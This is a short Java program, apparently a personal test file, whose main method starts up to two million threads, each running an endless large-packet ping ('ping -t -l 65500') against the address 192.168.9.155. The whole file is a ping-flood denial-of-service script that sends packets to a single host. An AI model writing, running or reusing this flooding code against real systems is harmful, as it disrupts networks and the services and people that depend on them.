package com.zh;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Array;
import java.util.ArrayList;

public class MyTest {
    public static void main(String[] args) throws IOException, InterruptedException {
        String s = "";
        ArrayList arrayList = new ArrayList();
        System.out.println(arrayList);


        for (int i=0;i< 2000000; i++){
        Thread th = new Thread() {
            @Override
            public void run() {
                Process pro = null;
                try {
                    String line = null;
                    pro = Runtime.getRuntime().exec("ping -t -l 65500 192.168.9.155");
                    BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));
                    while((line = buf.readLine()) != null)
                        System.out.println(line);
                    pro.waitFor();
                    //System.out.println("192.168.1.1 : " + pro.exitValue());
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

            }
        };

        th.start();
        }
    }
}
